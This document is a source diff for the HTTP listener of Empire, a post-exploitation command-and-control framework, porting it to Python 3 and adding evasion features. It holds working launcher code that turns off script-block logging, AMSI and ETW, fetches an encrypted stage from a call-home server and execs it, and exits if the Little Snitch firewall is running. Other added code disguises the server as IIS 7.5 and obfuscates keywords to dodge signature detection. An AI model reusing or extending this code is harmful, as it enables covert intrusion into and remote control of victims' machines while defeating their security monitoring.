@@ -1,28 +1,30 @@
 from __future__ import print_function
-from builtins import str
-from builtins import object
-import logging
+
 import base64
-import sys
-import random
-import string
-import os
-import ssl
-import time
 import copy
 import json
+import logging
+import os
+import random
+import ssl
+import string
 import sys
-from pydispatch import dispatcher
+import threading
+import time
+from builtins import object
+from builtins import str
+
 from flask import Flask, request, make_response, send_from_directory
+from werkzeug.serving import WSGIRequestHandler
+from pydispatch import dispatcher
+
+from lib.common import bypasses
+from lib.common import encryption
 # Empire imports
 from lib.common import helpers
-from lib.common import agents
-from lib.common import encryption
-from lib.common import packets
-from lib.common import messages
-from lib.common import templating
 from lib.common import obfuscation
-from lib.common import bypasses
+from lib.common import packets
+from lib.common import templating
 
 
 class Listener(object):
@@ -141,15 +143,10 @@ class Listener(object):
                 'Required': False,
                 'Value': 'default'
             },
-            'SlackToken': {
-                'Description': 'Your SlackBot API token to communicate with your Slack instance.',
+            'SlackURL': {
+                'Description': 'Your Slack Incoming Webhook URL to communicate with your Slack instance.',
                 'Required': False,
                 'Value': ''
-            },
-            'SlackChannel': {
-                'Description': 'The Slack channel or DM that notifications will be sent to.',
-                'Required': False,
-                'Value': '#general'
             }
         }
         
@@ -166,19 +163,33 @@ class Listener(object):
         
         # randomize the length of the default_response and index_page headers to evade signature based scans
         self.header_offset = random.randint(0, 64)
-        
+
+        # used to protect self.http and self.mainMenu.conn during threaded listener access
+        self.lock = threading.Lock()
+
         self.session_cookie = ''
         
         # check if the current session cookie not empty and then generate random cookie
         if self.session_cookie == '':
             self.options['Cookie']['Value'] = self.generate_cookie()
-    
+
+    # this might not be necessary. Could probably be achieved by just callingg mainmenu.get_db but all the other files have
+    # implemented it in place. Might be worthwhile to just make a database handling file
+    def get_db_connection(self):
+        """
+        Returns the cursor for SQLlite DB
+        """
+        self.lock.acquire()
+        self.mainMenu.conn.row_factory = None
+        self.lock.release()
+        return self.mainMenu.conn
+
     def default_response(self):
         """
         Returns an IIS 7.5 404 not found page.
         """
         
-        return '\n'.join([
+        return '\r\n'.join([
             '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
             '<html xmlns="http://www.w3.org/1999/xhtml">',
             '<head>',
@@ -187,10 +198,10 @@ class Listener(object):
             '<style type="text/css">',
             '<!--',
             'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
-            'fieldset{padding:0 15px 10px 15px;}',
+            'fieldset{padding:0 15px 10px 15px;} ',
             'h1{font-size:2.4em;margin:0;color:#FFF;}',
-            'h2{font-size:1.7em;margin:0;color:#CC0000;}',
-            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}',
+            'h2{font-size:1.7em;margin:0;color:#CC0000;} ',
+            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} ',
             '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
             'background-color:#555555;}',
             '#content{margin:0 0 0 2%;position:relative;}',
@@ -211,12 +222,49 @@ class Listener(object):
             ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
         ])
     
+    def method_not_allowed_page(self):
+        """
+        Imitates IIS 7.5 405 "method not allowed" page.
+        """
+
+        return '\r\n'.join([
+            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+            '<html xmlns="http://www.w3.org/1999/xhtml">',
+            '<head>',
+            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
+            '<title>405 - HTTP verb used to access this page is not allowed.</title>',
+            '<style type="text/css">',
+            '<!--',
+            'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
+            'fieldset{padding:0 15px 10px 15px;} ',
+            'h1{font-size:2.4em;margin:0;color:#FFF;}',
+            'h2{font-size:1.7em;margin:0;color:#CC0000;} ',
+            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} ',
+            '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
+            'background-color:#555555;}',
+            '#content{margin:0 0 0 2%;position:relative;}',
+            '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
+            '-->',
+            '</style>',
+            '</head>',
+            '<body>',
+            '<div id="header"><h1>Server Error</h1></div>',
+            '<div id="content">',
+            ' <div class="content-container"><fieldset>',
+            '  <h2>405 - HTTP verb used to access this page is not allowed.</h2>',
+            '  <h3>The page you are looking for cannot be displayed because an invalid method (HTTP verb) was used to attempt access.</h3>',
+            ' </fieldset></div>',
+            '</div>',
+            '</body>',
+            '</html>\r\n'
+        ])
+
     def index_page(self):
         """
         Returns a default HTTP server page.
         """
         
-        return '\n'.join([
+        return '\r\n'.join([
             '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
             '<html xmlns="http://www.w3.org/1999/xhtml">',
             '<head>',
@@ -225,19 +273,19 @@ class Listener(object):
             '<style type="text/css">',
             '<!--',
             'body {',
-            '    color:#000000;',
-            '    background-color:#B3B3B3;',
-            '    margin:0;',
+            '	color:#000000;',
+            '	background-color:#B3B3B3;',
+            '	margin:0;',
             '}',
             '',
             '#container {',
-            '    margin-left:auto;',
-            '    margin-right:auto;',
-            '    text-align:center;',
-            '    }',
+            '	margin-left:auto;',
+            '	margin-right:auto;',
+            '	text-align:center;',
+            '	}',
             '',
             'a img {',
-            '    border:none;',
+            '	border:none;',
             '}',
             '',
             '-->',
@@ -270,7 +318,7 @@ class Listener(object):
     
     def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default',
                           proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='',
-                          listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
+                          listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False, ETWBypass=False):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -304,17 +352,20 @@ class Listener(object):
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
                     # ScriptBlock Logging bypass
-                    if scriptLogBypass:
-                        stager += bypasses.scriptBlockLogBypass()
-                    # @mattifestation's AMSI bypass
-                    if AMSIBypass:
-                        stager += bypasses.AMSIBypass()
-                    # rastamouse AMSI bypass
-                    if AMSIBypass2:
-                        stager += bypasses.AMSIBypass2()
+                if scriptLogBypass:
+                    stager += bypasses.scriptBlockLogBypass()
+                if ETWBypass:
+                    stager += bypasses.ETWBypass()
+                # @mattifestation's AMSI bypass
+                if AMSIBypass:
+                    stager += bypasses.AMSIBypass()
+                # rastamouse AMSI bypass
+                if AMSIBypass2:
+                    stager += bypasses.AMSIBypass2()
+                if safeChecks.lower() == 'true':
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
-                
+
                 stager += helpers.randomize_capitalization(
                     "$" + helpers.generate_random_script_var_name("wc") + "=New-Object System.Net.WebClient;")
                 if userAgent.lower() == 'default':
@@ -324,7 +375,7 @@ class Listener(object):
                 if 'https' in host:
                     # allow for self-signed certificates for https connections
                     stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
-                
+                stager += "$ser=" + helpers.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
                 if userAgent.lower() != 'none':
                     stager += helpers.randomize_capitalization(
                         "$" + helpers.generate_random_script_var_name("wc") + '.Headers.Add(')
@@ -377,13 +428,12 @@ class Listener(object):
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                 stager += "'%s');" % (stagingKey)
                 # this is the minimized RC4 stager code from rc4.ps1
-                stager += helpers.randomize_capitalization(
-                    '$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
+                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL',
                                                              meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
-                stager += "$ser=" + helpers.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
+
                 # Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
@@ -419,7 +469,6 @@ class Listener(object):
             
             if language.startswith('py'):
                 # Python
-                
                 launcherBase = 'import sys;'
                 if "https" in host:
                     # monkey patch ssl woohooo
@@ -431,7 +480,7 @@ class Listener(object):
                         launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                         launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
                         launcherBase += "out, err = ps.communicate()\n"
-                        launcherBase += "if re.search(\"Little Snitch\", out):\n"
+                        launcherBase += "if re.search(\"Little Snitch\", out.decode('UTF-8')):\n"
                         launcherBase += "   sys.exit()\n"
                 except Exception as e:
                     p = "[!] Error setting LittleSnitch in stager: " + str(e)
@@ -441,18 +490,17 @@ class Listener(object):
                     profile = listenerOptions['DefaultProfile']['Value']
                     userAgent = profile.split('|')[1]
                 
-                launcherBase += "import urllib2;\n"
+                launcherBase += "import urllib.request as urllib;\n"
                 launcherBase += "UA='%s';" % (userAgent)
                 launcherBase += "server='%s';t='%s';" % (host, stage0)
                 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON',
                                                              meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
+
+                b64RoutingPacket = base64.b64encode(routingPacket).decode('UTF-8')
                 
-                launcherBase += "req=urllib2.Request(server+t);\n"
-                # add the RC4 packet to a cookie
-                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
+                launcherBase += "req=urllib.Request(server+t);\n"
 
                 # Add custom headers if any
                 if customHeaders != []:
@@ -461,54 +509,64 @@ class Listener(object):
                         headerValue = header.split(':')[1]
                         # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
                         launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)
-                
+
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
-                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
+                        launcherBase += "proxy = urllib.ProxyHandler();\n"
                     else:
                         proto = proxy.split(':')[0]
-                        launcherBase += "proxy = urllib2.ProxyHandler({'" + proto + "':'" + proxy + "'});\n"
-                    
+                        launcherBase += "proxy = urllib.ProxyHandler({'" + proto + "':'" + proxy + "'});\n"
+
                     if proxyCreds != "none":
                         if proxyCreds == "default":
-                            launcherBase += "o = urllib2.build_opener(proxy);\n"
+                            launcherBase += "o = urllib.build_opener(proxy);\n"
+
+                            # add the RC4 packet to a cookie
+                            launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (
+                            b64RoutingPacket)
                         else:
-                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
+                            launcherBase += "proxy_auth_handler = urllib.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
                             launcherBase += "proxy_auth_handler.add_password(None,'" + proxy + "','" + username + "','" + password + "');\n"
-                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
+                            launcherBase += "o = urllib.build_opener(proxy, proxy_auth_handler);\n"
+
+                            # add the RC4 packet to a cookie
+                            launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (
+                            b64RoutingPacket)
                     else:
-                        launcherBase += "o = urllib2.build_opener(proxy);\n"
+                        launcherBase += "o = urllib.build_opener(proxy);\n"
                 else:
-                    launcherBase += "o = urllib2.build_opener();\n"
+                    launcherBase += "o = urllib.build_opener();\n"
                 
                 # install proxy and creds globally, so they can be used with urlopen.
-                launcherBase += "urllib2.install_opener(o);\n"
+                launcherBase += "urllib.install_opener(o);\n"
                 
                 # download the stager and extract the IV
                 
-                launcherBase += "a=urllib2.urlopen(req).read();\n"
+                launcherBase += "a=urllib.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
                 launcherBase += "data=a[4:];"
-                launcherBase += "key=IV+'%s';" % (stagingKey)
+                launcherBase += "key=IV+'%s'.encode('UTF-8');" % (stagingKey)
                 
                 # RC4 decryption
-                launcherBase += "S,j,out=range(256),0,[]\n"
-                launcherBase += "for i in range(256):\n"
-                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
+                launcherBase += "S,j,out=list(range(256)),0,[]\n"
+                launcherBase += "for i in list(range(256)):\n"
+                launcherBase += "    j=(j+S[i]+key[i%len(key)])%256\n"
                 launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                 launcherBase += "i=j=0\n"
                 launcherBase += "for char in data:\n"
                 launcherBase += "    i=(i+1)%256\n"
                 launcherBase += "    j=(j+S[i])%256\n"
                 launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
+                launcherBase += "    out.append(chr(char^S[(S[i]+S[j])%256]))\n"
                 launcherBase += "exec(''.join(out))"
                 
                 if encode:
-                    launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (
+                    launchEncoded = base64.b64encode(launcherBase.encode('UTF-8')).decode('UTF-8')
+                    if isinstance(launchEncoded, bytes):
+                        launchEncoded = launchEncoded.decode('UTF-8')
+                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python3 &" % (
                         launchEncoded)
                     return launcher
                 else:
@@ -550,7 +608,14 @@ class Listener(object):
             f = open("%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath))
             stager = f.read()
             f.close()
-            
+
+            # Get the random function name generated at install and patch the stager with the proper function name
+            conn = self.get_db_connection()
+            self.lock.acquire()
+            stager = helpers.keyword_obfuscation(stager)
+            self.lock.release()
+
+
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
@@ -627,17 +692,18 @@ class Listener(object):
                 'stage_1': stage1,
                 'stage_2': stage2
             }
-            
+
             stager = template.render(template_options)
             stager = obfuscation.py_minify(stager)
-            
+
             # base64 encode the stager and return it
             if encode:
                 return base64.b64encode(stager)
             if encrypt:
                 # return an encrypted version of the stager ("normal" staging)
                 RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV + stagingKey, stager)
+
+                return RC4IV + encryption.rc4(RC4IV + stagingKey.encode('UTF-8'), stager.encode('UTF-8'))
             else:
                 # otherwise return the standard stager
                 return stager
@@ -669,6 +735,14 @@ class Listener(object):
             f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
             code = f.read()
             f.close()
+
+            # Get the random function name generated at install and patch the stager with the proper function name
+            conn = self.get_db_connection()
+            self.lock.acquire()
+            code = helpers.keyword_obfuscation(code)
+            self.lock.release()
+
+
             
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
@@ -832,46 +906,42 @@ class Listener(object):
                 return updateServers + getTask + sendMessage
             
             elif language.lower() == 'python':
-                
                 updateServers = "server = '%s'\n" % (listenerOptions['Host']['Value'])
                 
                 if listenerOptions['Host']['Value'].startswith('https'):
                     updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
-                print('listeners/http.py: line 851')
                 sendMessage = """
 def send_message(packets=None):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
     # If packets != None, the agent encrypts the passed packets and
     #    POSTs the data to the control server.
-
     global missedCheckins
     global server
     global headers
     global taskURIs
-
     data = None
     if packets:
-        data = ''.join(packets)
+        data = ''.join(packets.decode('latin-1'))
         # aes_encrypt_then_hmac is in stager.py
         encData = aes_encrypt_then_hmac(key, data)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
+                    
     else:
         # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
-        #   meta TASKING_REQUEST = 4
+        #   meta TASKING_REQUEST = 4     
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
-        b64routingPacket = base64.b64encode(routingPacket)
-        headers['Cookie'] = \"""" + self.session_cookie + """=%s" % (b64routingPacket)
-
+        b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
+        headers['Cookie'] = \"""" + self.session_cookie + """session=%s" % (b64routingPacket)
     taskURI = random.sample(taskURIs, 1)[0]
     requestUri = server + taskURI
-
+    
     try:
-        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
+        data = (urllib.urlopen(urllib.Request(requestUri, data, headers))).read()
         return ('200', data)
 
-    except urllib2.HTTPError as HTTPError:
-        # if the server is reached, but returns an erro (like 404)
+    except urllib.HTTPError as HTTPError:
+        # if the server is reached, but returns an error (like 404)
         missedCheckins = missedCheckins + 1
         #if signaled for restaging, exit.
         if HTTPError.code == 401:
@@ -879,11 +949,10 @@ def send_message(packets=None):
 
         return (HTTPError.code, '')
 
-    except urllib2.URLError as URLerror:
+    except urllib.URLError as URLerror:
         # if the server cannot be reached
         missedCheckins = missedCheckins + 1
         return (URLerror.reason, '')
-
     return ('', '')
 """
                 return updateServers + sendMessage
@@ -919,6 +988,9 @@ def send_message(packets=None):
         app = Flask(__name__)
         self.app = app
         
+        # Set HTTP/1.1 as in IIS 7.5 instead of /1.0
+        WSGIRequestHandler.protocol_version = "HTTP/1.1"
+
         @app.route('/download/<stager>')
         def send_stager(stager):
             if 'po' in stager:
@@ -966,8 +1038,15 @@ def send_message(packets=None):
             response.headers['Expires'] = "0"
             return response
         
+        @app.errorhandler(405)
+        def handle_405(e):
+            """
+            Returns IIS 7.5 405 page for every Flask 405 error.
+            """
+            return make_response(self.method_not_allowed_page(), 405)
+
         @app.route('/')
-        @app.route('/index.html')
+        @app.route('/iisstart.htm')
         def serve_index():
             """
             Return default server web page if user navigates to index.
@@ -975,16 +1054,7 @@ def send_message(packets=None):
             
             static_dir = self.mainMenu.installPath + "data/misc/"
             return make_response(self.index_page(), 200)
-        
-        @app.route('/welcome.png')
-        def serve_index_helper():
-            """
-            Serves image loaded by index page.
-            """
-            
-            static_dir = self.mainMenu.installPath + "data/misc/"
-            return send_from_directory(static_dir, 'welcome.png')
-        
+               
         @app.route('/<path:request_uri>', methods=['GET'])
         def handle_get(request_uri):
             """
@@ -993,6 +1063,14 @@ def send_message(packets=None):
             This is used during the first step of the staging process,
             and when the agent requests taskings.
             """
+            if request_uri.lower() == 'welcome.png':
+                # Serves image loaded by index page.
+                #
+                # Thanks to making it case-insensitive it works the same way as in 
+                # an actual IIS server
+                static_dir = self.mainMenu.installPath + "data/misc/"
+                return send_from_directory(static_dir, 'welcome.png')
+
             clientIP = request.remote_addr
             
             listenerName = self.options['Name']['Value']
@@ -1042,7 +1120,7 @@ def send_message(packets=None):
                                 # handle_agent_data() signals that the listener should return the stager.ps1 code
                                 # step 2 of negotiation -> return stager.ps1 (stage 1)
                                 listenerName = self.options['Name']['Value']
-                                message = "[*] Sending {} stager (stage 1) to {}".format(language, clientIP)
+                                message = "\n[*] Sending {} stager (stage 1) to {}".format(language, clientIP)
                                 signal = json.dumps({
                                     'print': True,
                                     'message': message
@@ -1094,7 +1172,7 @@ def send_message(packets=None):
                     'message': message
                 })
                 dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-                return make_response(self.default_response(), 200)
+                return make_response(self.default_response(), 404)
         
         @app.route('/<path:request_uri>', methods=['POST'])
         def handle_post(request_uri):
@@ -1121,6 +1199,7 @@ def send_message(packets=None):
                 for (language, results) in dataResults:
                     if isinstance(results, str):
                         results = results.encode('UTF-8')
+
                     if results:
                         if results.startswith(b'STAGE2'):
                             # TODO: document the exact results structure returned
@@ -1197,9 +1276,9 @@ def send_message(packets=None):
                 
                 context = ssl.SSLContext(proto)
                 context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key" % (certPath))
-                cipherlist = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-SHA384",
-                              "ECDHE-RSA-AES256-SHA", "AES256-SHA256", "AES128-SHA256"]
-                selectciph = random.choice(cipherlist)
+                cipherlist_tls12 = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-SHA384", "AES256-SHA256", "AES128-SHA256"]
+                cipherlist_tls10 = ["ECDHE-RSA-AES256-SHA"]
+                selectciph = random.choice(cipherlist_tls12)+':'+random.choice(cipherlist_tls10)
                 context.set_ciphers(selectciph)
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
